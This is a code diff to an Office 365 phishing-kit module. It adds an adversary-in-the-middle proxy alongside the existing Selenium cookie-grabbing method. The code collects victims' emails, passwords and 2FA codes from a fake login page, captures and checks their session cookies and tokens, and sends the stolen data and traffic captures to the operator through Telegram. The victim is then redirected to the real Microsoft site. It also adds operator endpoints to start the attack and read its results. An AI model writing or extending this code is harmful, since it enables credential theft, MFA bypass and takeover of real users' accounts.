@@ -3,6 +3,7 @@ from flask import redirect, request, session
 import json, time
 from os import getenv
 from core.base_module import BaseModule
+from core.aitm_proxy import AiTMManager
 import requests
 import traceback
 from selenium import webdriver
@@ -10,10 +11,10 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
-import os, traceback, shutil, datetime
+import os, traceback, shutil, datetime, threading
 
 class Office365Module(BaseModule):
-    def __init__(self, enable_2fa=False):
+    def __init__(self, enable_2fa=False, use_aitm_proxy=True):
         super().__init__(self)
         self.set_name('office365')
         self.add_route('login', '/')
@@ -22,7 +23,16 @@ class Office365Module(BaseModule):
         self.add_route('loading', '/loading')
         self.add_route('twofactor', '/twofactor')
         self.add_route('redirect', '/redirect')
+        # AiTM proxy routes
+        self.add_route('aitm_status', '/aitm/status')
+        self.add_route('aitm_start', '/aitm/start')
+        self.add_route('aitm_results', '/aitm/results')
+        
         self.enable_two_factor(enable_2fa)
+        self.use_aitm_proxy = use_aitm_proxy
+        self.aitm_manager = AiTMManager()
+        self.aitm_proxy_url = None
+        self.attack_mode = "aitm"  # "aitm" or "selenium"
 
     def login(self):
         template = self.env.get_template('login.html')
@@ -66,7 +76,74 @@ class Office365Module(BaseModule):
         self.captured_password = request.values.get('password')
         self.two_factor_token = request.values.get('two_factor_token')
 
-        # Off-load the slow Selenium work so we answer the HTTP request immediately
+        # Choose attack method: AiTM proxy first, Selenium fallback
+        if self.use_aitm_proxy and self.attack_mode == "aitm":
+            # Try AiTM proxy method first
+            return self._handle_aitm_attack()
+        else:
+            # Fall back to Selenium method
+            return self._handle_selenium_attack()
+
+    def _handle_aitm_attack(self):
+        """Handle AiTM proxy-based attack"""
+        import threading, json
+        
+        def _aitm_worker(user, pwd, token):
+            try:
+                # Start AiTM proxy
+                proxy_result = self.aitm_manager.start_aitm_attack(
+                    victim_email=user, 
+                    proxy_port=8080
+                )
+                
+                if proxy_result.get('success'):
+                    self.aitm_proxy_url = proxy_result['proxy_url']
+                    
+                    # Wait for victim to interact with proxy (simulate or wait for real interaction)
+                    # In real scenario, victim would be redirected to proxy URL
+                    time.sleep(30)  # Wait for potential interaction
+                    
+                    # Get captured data from proxy
+                    captured_data = self.aitm_manager.get_attack_results()
+                    
+                    # Validate captured cookies
+                    validation_result = self.aitm_manager.validate_session()
+                    
+                    # Stop proxy
+                    self.aitm_manager.stop_aitm_attack()
+                    
+                    # Format results for Telegram
+                    if captured_data.get('cookies') or captured_data.get('credentials'):
+                        self._send_aitm_results(user, pwd, token, captured_data, validation_result)
+                    else:
+                        # AiTM failed, fall back to Selenium
+                        self.attack_mode = "selenium"
+                        self._selenium_fallback(user, pwd, token)
+                else:
+                    # AiTM startup failed, fall back to Selenium
+                    self.attack_mode = "selenium"
+                    self._selenium_fallback(user, pwd, token)
+                    
+            except Exception as ex:
+                print(f"[aitm_worker] Exception: {ex}")
+                # AiTM failed, fall back to Selenium
+                self.attack_mode = "selenium"
+                self._selenium_fallback(user, pwd, token)
+        
+        threading.Thread(target=_aitm_worker, args=(self.user, self.captured_password, self.two_factor_token), daemon=True).start()
+        
+        # Redirect victim to proxy URL if available, otherwise to real Microsoft
+        if self.aitm_proxy_url:
+            return redirect(self.aitm_proxy_url, code=302)
+        else:
+            return redirect(self.final_url, code=302)
+
+    def _handle_selenium_attack(self):
+        """Handle Selenium-based attack (original method)"""
+        return self._selenium_fallback(self.user, self.captured_password, self.two_factor_token)
+
+    def _selenium_fallback(self, user, pwd, token):
+        """Selenium fallback method (original implementation)"""
         import threading, json
 
         def _cookie_worker(user, pwd, token):
@@ -134,17 +211,122 @@ class Office365Module(BaseModule):
                 cookie_block = json.dumps(cookies, indent=2) if cookies else 'Cookie capture failed'
             
             msg = (
-                f"*O365 Credential Capture (Full)*\nEmail: `{user}`\nPassword: `{pwd}`\n2FA: `{token}`\n\nCookies:\n```\n{cookie_block}\n```"
+                f"*O365 Credential Capture (Selenium Fallback)*\nEmail: `{user}`\nPassword: `{pwd}`\n2FA: `{token}`\n\nCookies:\n```\n{cookie_block}\n```"
             )
             if artefact_links:
                 msg += "\n\nDebug artefacts:\n" + "\n".join(artefact_links)
 
             self.send_telegram(msg, document_paths=doc_paths if doc_paths else None)
 
-        threading.Thread(target=_cookie_worker, args=(self.user, self.captured_password, self.two_factor_token), daemon=True).start()
+        threading.Thread(target=_cookie_worker, args=(user, pwd, token), daemon=True).start()
 
         # Give the victim the real Microsoft redirect right away
         return redirect(self.final_url, code=302)
+
+    def _send_aitm_results(self, user, pwd, token, captured_data, validation_result):
+        """Send AiTM attack results via Telegram"""
+        try:
+            # Format captured data
+            credentials_info = captured_data.get('credentials', {})
+            cookies_count = len(captured_data.get('cookies', []))
+            tokens_count = len(captured_data.get('tokens', []))
+            
+            # Check if session is valid
+            session_status = "✅ VALID" if validation_result.get('valid') else "❌ INVALID"
+            
+            msg = (
+                f"*O365 AiTM Attack Results*\n"
+                f"🎯 Attack Mode: `Adversary-in-the-Middle`\n"
+                f"📧 Email: `{user}`\n"
+                f"🔑 Password: `{pwd}`\n"
+                f"🔐 2FA: `{token}`\n\n"
+                f"🍪 Cookies Captured: `{cookies_count}`\n"
+                f"🎟️ Tokens Captured: `{tokens_count}`\n"
+                f"✨ Session Status: {session_status}\n\n"
+            )
+            
+            # Add captured credentials from proxy
+            if credentials_info:
+                msg += "📋 Proxy Captured:\n"
+                for key, value in credentials_info.items():
+                    if key == 'password':
+                        msg += f"  {key}: `{'*' * len(str(value))}`\n"
+                    else:
+                        msg += f"  {key}: `{value}`\n"
+                msg += "\n"
+            
+            # Add cookies summary
+            if captured_data.get('cookies'):
+                important_cookies = []
+                for cookie_data in captured_data['cookies']:
+                    cookie = cookie_data.get('parsed', {})
+                    if cookie.get('name'):
+                        name = cookie['name']
+                        if any(important in name.upper() for important in ['ESTSAUTH', 'STSSERVICE', 'BUID', 'FPC']):
+                            important_cookies.append(name)
+                
+                if important_cookies:
+                    msg += f"🔑 Key Cookies: `{', '.join(important_cookies[:5])}`\n"
+            
+            # Add validation details
+            if validation_result:
+                msg += f"🔍 Validation URL: `{validation_result.get('test_url', 'N/A')}`\n"
+                msg += f"📊 Response Code: `{validation_result.get('status_code', 'N/A')}`\n"
+            
+            # Save HAR file and include in message
+            har_paths = []
+            if hasattr(self.aitm_manager.proxy, 'save_har_file'):
+                timestamp = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
+                har_path = f'/tmp/aitm_traffic_{timestamp}.har'
+                if self.aitm_manager.proxy.save_har_file(har_path):
+                    har_paths.append(har_path)
+            
+            self.send_telegram(msg, document_paths=har_paths if har_paths else None)
+            
+        except Exception as e:
+            print(f"Error sending AiTM results: {e}")
+            # Send basic message as fallback
+            fallback_msg = f"*O365 AiTM Attack Completed*\nEmail: `{user}`\nCookies: `{len(captured_data.get('cookies', []))}`"
+            self.send_telegram(fallback_msg)
+
+    def aitm_status(self):
+        """API endpoint to check AiTM proxy status"""
+        try:
+            status = {
+                'aitm_enabled': self.use_aitm_proxy,
+                'attack_mode': self.attack_mode,
+                'proxy_running': self.aitm_manager.proxy_enabled if self.aitm_manager else False,
+                'proxy_url': self.aitm_proxy_url
+            }
+            return json.dumps(status, indent=2)
+        except Exception as e:
+            return json.dumps({'error': str(e)})
+
+    def aitm_start(self):
+        """API endpoint to manually start AiTM proxy"""
+        try:
+            email = request.values.get('email', 'target@company.com')
+            result = self.aitm_manager.start_aitm_attack(email)
+            if result.get('success'):
+                self.aitm_proxy_url = result['proxy_url']
+            return json.dumps(result, indent=2)
+        except Exception as e:
+            return json.dumps({'error': str(e)})
+
+    def aitm_results(self):
+        """API endpoint to get AiTM attack results"""
+        try:
+            if self.aitm_manager and self.aitm_manager.proxy:
+                results = self.aitm_manager.get_attack_results()
+                validation = self.aitm_manager.validate_session()
+                return json.dumps({
+                    'captured_data': results,
+                    'validation': validation
+                }, indent=2)
+            else:
+                return json.dumps({'error': 'No active AiTM proxy'})
+        except Exception as e:
+            return json.dumps({'error': str(e)})
 
     def send_telegram(self, message: str | None = None, document_paths: list | None = None):
         """Send a Markdown message and/or upload documents to Telegram.
@@ -868,5 +1050,5 @@ class Office365Module(BaseModule):
                 
         return cookies
 
-def load(enable_2fa=False):
-    return Office365Module(enable_2fa)
+def load(enable_2fa=False, use_aitm_proxy=True):
+    return Office365Module(enable_2fa, use_aitm_proxy)
